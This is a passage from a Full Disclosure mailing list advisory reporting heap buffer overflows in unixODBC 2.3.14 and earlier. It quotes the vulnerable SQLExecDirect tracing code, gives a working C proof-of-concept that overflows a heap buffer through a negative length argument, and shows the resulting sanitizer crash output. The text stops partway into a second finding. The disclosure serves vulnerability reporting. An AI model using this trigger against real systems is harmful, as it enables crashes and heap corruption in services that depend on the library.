---
title: unixODBC <=2.3.14 Multiple Heap Buffer Overflows, Underflows, and Over-Reads
url: https://seclists.org/fulldisclosure/2026/Nov/8
source: Full Disclosure
date: 2026-11-05
fetch_date: 2026-11-06T08:41:46.134978
---

# unixODBC <=2.3.14 Multiple Heap Buffer Overflows, Underflows, and Over-Reads

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](9)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](9)

![](/shared/images/nst-icons.svg#search)

# unixODBC <=2.3.14 Multiple Heap Buffer Overflows, Underflows, and Over-Reads

---

*From*: Daniel Owens via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 4 Nov 2026 00:40:34 +0000

---

```
unixODBC versions 2.3.14 and below contain multiple heap buffer overflows, underflows, and over-reads.  Attackers who
can influence various arguments passed thereto can trigger the heap-based buffer overflows inside of the unixODBC
driver manager itself, potentially corrupting the shared heap state across connections, crash the driver manager
(thereby causing denial of service conditions, multi-tenant data loss, and such related issues, depending on how the
calling information system leverages the library and is architected), information disclosure, and execute arbitrary
code, among other things.  Importantly, the unixODBC was also found to contain race conditions, integer underflows,
double-free/use-after-free, null pointer dereference, stack buffer overflows, and numerous other issues.  We may or may
not write those issues up, but this was all from a cursory glance through the code.

Examples
Sample Heap Buffer Overflows
While at least 8 different heap-based buffer overflows were discovered, the following serves as a blueprint to find
both the examples below and other instances.

SQLExecDirect's Unvalidated Caller-Supplied Length
When call tracing is enabled, `SQLExecDirect` allocates its trace-log buffer using the caller-supplied `text_length`,
doing so before verifying that the value is valid.  Attackers that pass a negative, non-`SQL_NTS` value, as such, cause
a negative value to be sent to the `sprintf` call, which standard C treats as "no precision given", turning the call
into an unbounded `%s` of the full, attacker-controlled `statement_text` string, overflowing the buffer.  Importantly,
this same mistake is made elsewhere, such as in `SQLPrepare`'s lines 185-189 which appears to be a copy-paste of the
offending code.

```c
SQLRETURN SQLExecDirect( SQLHSTMT statement_handle,
           SQLCHAR *statement_text,
           SQLINTEGER text_length )
{
    DMHSTMT statement = (DMHSTMT) statement_handle;
    SQLRETURN ret;
    SQLCHAR *s1;
    SQLCHAR s2[ 100 + LOG_MESSAGE_LEN ];

    /*
     * check statement
     */

    if ( !__validate_stmt( statement ))
    {
        dm_log_write( __FILE__,
                    __LINE__,
                    LOG_INFO,
                    LOG_INFO,
                    "Error: SQL_INVALID_HANDLE" );

        return SQL_INVALID_HANDLE;
    }

    function_entry( statement );

    if ( log_info.log_flag )
    {
        /*
         * allocate some space for the buffer
         */

        if ( statement_text && text_length == SQL_NTS )
        {
            s1 = malloc( strlen((char*) statement_text ) + LOG_MESSAGE_LEN );
        }
        else if ( statement_text )
        {
            s1 = malloc( text_length + LOG_MESSAGE_LEN );
        }
        else
        {
            s1 = malloc( LOG_MESSAGE_LEN );
        }

        sprintf( statement -> msg, "\n\t\tEntry:\
\n\t\t\tStatement = %p\
\n\t\t\tSQL = %s",
                statement,
                __string_with_length( s1, statement_text, text_length ));

        free( s1 );

        dm_log_write( __FILE__,
                __LINE__,
                LOG_INFO,
                LOG_INFO,
                statement -> msg );
    }
```
Snippet from `unixODBC`'s DriverManager/SQLExecDirect.c, lines 184-242

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sql.h>
#include <sqlext.h>

int main(void)
{
    SQLHENV henv = SQL_NULL_HENV;
    SQLHDBC hdbc = SQL_NULL_HDBC;
    SQLHSTMT hstmt = SQL_NULL_HSTMT;
    SQLRETURN rc;

    SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &henv);
    SQLSetEnvAttr(henv, SQL_ATTR_ODBC_VERSION, (SQLPOINTER)SQL_OV_ODBC3, 0);
    SQLAllocHandle(SQL_HANDLE_DBC, henv, &hdbc);

    /* Enable the tracing */
    SQLSetConnectAttr(hdbc, SQL_ATTR_TRACE, (SQLPOINTER)SQL_OPT_TRACE_ON, 0);

    /* Connect so that a valid STMT handle can be allocated -- the
     * overflow itself happens before any call reaches the driver. */
    rc = SQLConnect(hdbc, (SQLCHAR*)"test", SQL_NTS,
                     (SQLCHAR*)"", SQL_NTS, (SQLCHAR*)"", SQL_NTS);
    if (!SQL_SUCCEEDED(rc) && rc != SQL_SUCCESS_WITH_INFO) { return 2; }
    SQLAllocHandle(SQL_HANDLE_STMT, hdbc, &hstmt);

    /* Long, fully attacker-controlled SQL text. */
    size_t biglen = 8192;
    char *big_sql = malloc(biglen + 1);
    memset(big_sql, 'A', biglen);
    big_sql[biglen] = '\0';

    /* Negative text_length != SQL_NTS(-3) -> malloc(-50+128)=78
     * bytes, then __string_with_length's sprintf("%.*s", -50, ...)
     * treats the negative precision as "no precision", copying the
     * full 8192-byte string into the 78-byte buffer. */
    SQLExecDirect(hstmt, (SQLCHAR*)big_sql, -50);

    free(big_sql);
    return 0;
}
```
Sample code to overflow the buffer

```text
SQLAllocHandle(ENV) rc=0
SQLAllocHandle(DBC) rc=0
SQLSetConnectAttr(SQL_ATTR_TRACE, ON) rc=0
SQLConnect("test") rc=0
SQLAllocHandle(STMT) rc=0
Calling SQLExecDirect with text_length=-50, statement_text len=8192
=================================================================
==1301501==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x607000001f0e at pc 0x000000440c43 bp
0x7ffeee29bc20 sp 0x7ffeee29b3c0
WRITE of size 8209 at 0x607000001f0e thread T0
    #0 0x440c42 in __interceptor_vsprintf ...
    #1 0x441c37 in sprintf ...
    #2 0x7fa07e8ac894 in __string_with_length DriverManager/__info.c
    #3 0x7fa07e7ba507 in SQLExecDirect DriverManager/SQLExecDirect.c:235:17
    #4 0x4dedd9 in main repro.c:87:10
...
0x607000001f0e is located 0 bytes to the right of 78-byte region [0x607000001ec0,0x607000001f0e)
allocated by thread T0 here:
    #0 0x4a3492 in __interceptor_malloc ...
    #1 0x7fa07e7ba4d1 in SQLExecDirect DriverManager/SQLExecDirect.c
    #2 0x4dedd9 in main repro.c:87:10
...
SUMMARY: AddressSanitizer: heap-buffer-overflow ... in __interceptor_vsprintf
==1301501==ABORTING
```
Output from AddressSanitizer

```text
==1301663== Invalid write of size 8
==1301663==    at 0x4854166: mempcpy (vg_replace_strmem.c:1668)
==1301663==    by 0x49843F7: _IO_default_xsputn (in /usr/lib64/libc.so.6)
==1301663==    by 0x4960212: __vfprintf_internal (in /usr/lib64/libc.so.6)
==1301663==    by 0x4978C23: __vsprintf_internal (in /usr/lib64/libc.so.6)
==1301663==    by 0x495AFC7: sprintf (in /usr/lib64/libc.so.6)
==1301663==    by 0x48BA2E5: __string_with_length (__info.c:3242)
==1301663==    by 0x487AD7B: SQLExecDirect (SQLExecDirect.c:231)
==1301663==    by 0x401404: main (repro.c:87)
==1301663==  Address 0x4c78db1 is 8,033 bytes inside an unallocated block of size 2,711,952 in arena "client"

valgrind: m_mallocfree.c:303 (get_bszB_as_is): Assertion 'bszB_lo == bszB_hi' failed.
valgrind: Heap block lo/hi size mismatch: lo = 144, hi = 4702111234474983745.
```
Output from Valgrind

ODBCINSTSetProperty's Unbounded Property Name/Value Copy
Per the code below, `ODBCINSTAddProperty()` allocates a fixed-size `ODBCINSTPROPERTY` structure and then copies the
caller-supplied `pszProperty` and `pszValue` `char[]`s into its `szName` and `szValue` fields without ...